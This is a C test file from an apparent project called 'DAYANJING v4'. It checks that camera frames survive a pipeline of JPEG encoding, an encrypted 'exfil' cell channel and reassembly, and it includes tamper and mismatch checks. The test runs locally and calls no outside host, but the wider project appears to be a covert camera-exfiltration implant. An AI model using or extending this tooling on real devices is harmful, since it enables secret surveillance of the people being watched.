/*
 * DAYANJING v4 — test_exfil_fidelity.c
 *
 * 回传链路的内容保真度验证。
 *
 * ====================================================================
 * 为什么需要它（本文件存在的唯一理由）
 * ====================================================================
 * test_cam_e2e 已断言"重组结果与原始 JPEG 字节级一致"。那是对的，
 * 但**不够**：字节一致只证明"通路没改字节"，证明不了"画面还是那幅画面"。
 *
 * 实证：cam_jpeg.c 的 DCT 实现曾经是根本错误的，产出的码流
 *   - SOI/EOI 齐全，is_jpeg() 通过
 *   - 经 exfil 回传后字节级完全一致
 *   - 但解码出来的画面是无意义噪点（渐变帧亮度 MAE=50.24）
 * 也就是说：**整条回传链路全绿，而收到的画面是废的**。
 *
 * 本文件因此把判据推进一层：从"字节一致"推进到"解出来的像素对得上"。
 * 做法：
 *   1. 构造已知内容的 YUYV 帧（平滑渐变，贴近真实画面；
 *      不用随机帧——随机帧的高熵会掩盖编码错误，见 cam_jpeg 的教训）
 *   2. 原始 YUYV 落盘（供参考系换算）
 *   3. 走真实链路：转码 -> exfil 封装 -> 信元 -> 重组
 *   4. 重组产物落盘（供外部解码器打开）
 * 像素比对由 verify_exfil_fidelity.py 用真实解码器完成——
 * C 侧不自己解码（自己写的解码器会与编码器犯同样的错）。
 *
 * ====================================================================
 * 反向验证模式（argv[1]）
 * ====================================================================
 *   （无）        正常：编码参考图案 A，落盘参考系 A
 *   mismatch     编码图案 A，但落盘参考系 B（不同图案）
 *                  -> 像素比对必须失败。证明比对有鉴别力，不是恒绿
 *   mutwire      篡改一个信元字节
 *                  -> 重组必须失败（AEAD 拒绝）。证明重组成功不是恒绿
 */

#include "exfil.h"
#include "camera.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static int g_pass = 0;
static int g_fail = 0;

#define CHECK(cond, name)                                        \
    do {                                                         \
        if (cond) { g_pass++; printf("[PASS] %s\n", (name)); }    \
        else      { g_fail++; printf("[FAIL] %s\n", (name)); }    \
    } while (0)

/* 与 test_cam_e2e 不同的密钥对，避免"通道恰好复用"掩盖问题 */
static const uint8_t K_SEND[16] = {
    0x31,0x32,0x33,0x34,0x35,0x36,0x37,0x38,
    0x39,0x3a,0x3b,0x3c,0x3d,0x3e,0x3f,0x40
};
static const uint8_t K_RECV[16] = {
    0xa1,0xa2,0xa3,0xa4,0xa5,0xa6,0xa7,0xa8,
    0xa9,0xaa,0xab,0xac,0xad,0xae,0xaf,0xb0
};
static const uint8_t PFX[8] = { 0x5a,0x5b,0x5c,0x5d,0x5e,0x5f,0x60,0x61 };

static const uint32_t W = 320, H = 240;

/*
 * 图案 A：横向渐变（左暗右亮），轻微纵向起伏，色度恒定。
 * 恒定色度是刻意的——色度一旦编码错，会立刻体现在标量上，
 * 而渐变亮度用于测保真度（MAE）。
 */
static void fill_pattern_a(uint8_t *yuyv) {
    for (uint32_t y = 0; y < H; y++) {
        for (uint32_t x = 0; x < W; x += 2) {
            uint8_t y0 = (uint8_t)((x * 255) / (W - 1));
            uint8_t y1 = (uint8_t)(((x + 1) * 255) / (W - 1));
            size_t o = ((size_t)y * W + x) * 2;
            yuyv[o + 0] = y0;
            yuyv[o + 1] = 100;      /* U */
            yuyv[o + 2] = y1;
            yuyv[o + 3] = 150;      /* V */
        }
    }
}

/* 图案 B：纵向渐变（上暗下亮）——与 A 明显不同，用于 mismatch 反向验证 */
static void fill_pattern_b(uint8_t *yuyv) {
    for (uint32_t y = 0; y < H; y++) {
        uint8_t yy = (uint8_t)((y * 255) / (H - 1));
        for (uint32_t x = 0; x < W; x += 2) {
            size_t o = ((size_t)y * W + x) * 2;
            yuyv[o + 0] = yy;
            yuyv[o + 1] = 100;
            yuyv[o + 2] = yy;
            yuyv[o + 3] = 150;
        }
    }
}

static int dump_file(const char *path, const uint8_t *d, size_t n) {
    FILE *f = fopen(path, "wb");
    if (!f) return -1;
    size_t w = fwrite(d, 1, n, f);
    fclose(f);
    return (w == n) ? 0 : -1;
}

int main(int argc, char **argv) {
    const char *mode = (argc > 1) ? argv[1] : "normal";
    const char *ref_path  = (argc > 2) ? argv[2] : "/tmp/fid_ref.yuyv";
    const char *out_path  = (argc > 3) ? argv[3] : "/tmp/fid_out.jpg";

    int mism = (strcmp(mode, "mismatch") == 0);
    int mutw = (strcmp(mode, "mutwire")  == 0);

    printf("=== 回传链路内容保真度 (mode=%s) ===\n", mode);

    size_t ylen = (size_t)W * H * 2;
    uint8_t *yuyv = (uint8_t *)malloc(ylen);
    uint8_t *ref  = (uint8_t *)malloc(ylen);
    if (!yuyv || !ref) { printf("[FATAL] 内存不足\n"); return 2; }

    fill_pattern_a(yuyv);
    if (mism) fill_pattern_b(ref); else memcpy(ref, yuyv, ylen);

    /* 参考系落盘：外部解码器的比对基准 */
    CHECK(dump_file(ref_path, ref, ylen) == 0, "参考 YUYV 已落盘");

    cam_frame_t f;
    memset(&f, 0, sizeof(f));
    f.data = yuyv; f.len = ylen;
    f.fmt = CAM_FMT_YUYV422;
    f.width = W; f.height = H;
    f.pts_us = 1700000000999999ULL;

    size_t cap = 0, need = 0;
    CHECK(cam_frame_to_jpeg(&f, NULL, &cap, &need) == CAM_OK, "探测 JPEG 容量");
    CHECK(need > 0, "探测长度非零");

    uint8_t *jpg = (uint8_t *)malloc(need);
    if (!jpg) { printf("[FATAL] 内存不足\n"); return 2; }
    size_t jcap = need, jlen = 0;
    CHECK(cam_frame_to_jpeg(&f, jpg, &jcap, &jlen) == CAM_OK, "转码为 JPEG");
    CHECK(jlen > 0 && jlen == need, "转码长度与探测一致");

    /* ---- 回传 ---- */
    exfil_chan_t tx, rx;
    CHECK(exfil_chan_init(&tx, K_SEND, K_RECV, PFX, 0) == EXF_OK, "发送通道初始化");
    CHECK(exfil_chan_init(&rx, K_RECV, K_SEND, PFX, 0) == EXF_OK, "接收通道初始化");

    exfil_rec_t r;
    memset(&r, 0, sizeof(r));
    r.type = EXF_TYPE_CAMERA_JPEG;
    r.seq = 7; r.ts_us = f.pts_us;
    r.width = W; r.height = H;
    r.flags = EXF_FLAG_KEYFRAME | EXF_FLAG_LAST;
    snprintf(r.name, sizeof(r.name), "fidelity-cam-0");
    r.payload = jpg; r.plen = jlen;

    size_t ncells = 0;
    CHECK(exfil_send_cells(&r, &ncells) == EXF_OK, "计算信元数");
    CHECK(ncells > 1, "跨多个信元（大帧）");

    uint8_t *wire = (uint8_t *)malloc(ncells * P2P_CELL_WIRE);
    size_t got = 0;
    CHECK(exfil_chan_send(&tx, &r, wire, ncells * P2P_CELL_WIRE, &got) == EXF_OK, "封装并发送");
    CHECK(got == ncells, "信元数一致");

    if (mutw) {
        /* 篡改最后一个信元的中间一字节：AEAD 必须拒绝 */
        wire[(ncells - 1) * P2P_CELL_WIRE + 40] ^= 0x40;
    }

    uint8_t *out = (uint8_t *)malloc(jlen + 64);
    exfil_rec_t rd;
    memset(&rd, 0, sizeof(rd));
    size_t outlen = 0;
    int rc = 0;
    for (size_t i = 0; i < got; i++) {
        rc = exfil_chan_feed(&rx, wire + i * P2P_CELL_WIRE, &rd, out, jlen + 64, &outlen);
        if (rc < 0) break;
    }

    if (mutw) {
        CHECK(rc != EXF_DONE, "篡改信元后重组必须失败（AEAD 拒绝）");
        CHECK(outlen != jlen || memcmp(out, jpg, jlen) != 0, "篡改后不得产出原始画面");
        printf("\n=== total=%d pass=%d fail=%d ===\n", g_pass + g_fail, g_pass, g_fail);
        free(wire); free(out); free(jpg); free(yuyv); free(ref);
        exfil_chan_wipe(&tx); exfil_chan_wipe(&rx);
        return g_fail ? 1 : 0;
    }

    CHECK(rc == EXF_DONE, "重组完成（收到 FIN）");
    CHECK(outlen == jlen, "重组长度与原始 JPEG 一致");
    CHECK(memcmp(out, jpg, jlen) == 0, "重组结果字节级一致");
    CHECK(rd.width == W && rd.height == H, "分辨率一致");
    CHECK(rd.type == EXF_TYPE_CAMERA_JPEG, "产物类型一致");
    CHECK(exfil_chan_incomplete(&rx) == 0, "批已完整");

    /* 重组产物落盘：由外部真实解码器判定"画面是否还是那幅画面" */
    CHECK(dump_file(out_path, out, outlen) == 0, "重组 JPEG 已落盘");
    printf("      JPEG %zu 字节 -> %zu 信元 -> 重组 %zu 字节\n", jlen, ncells, outlen);

    free(wire); free(out); free(jpg); free(yuyv); free(ref);
    exfil_chan_wipe(&tx); exfil_chan_wipe(&rx);

    printf("\n=== total=%d pass=%d fail=%d ===\n", g_pass + g_fail, g_pass, g_fail);
    return g_fail ? 1 : 0;
}
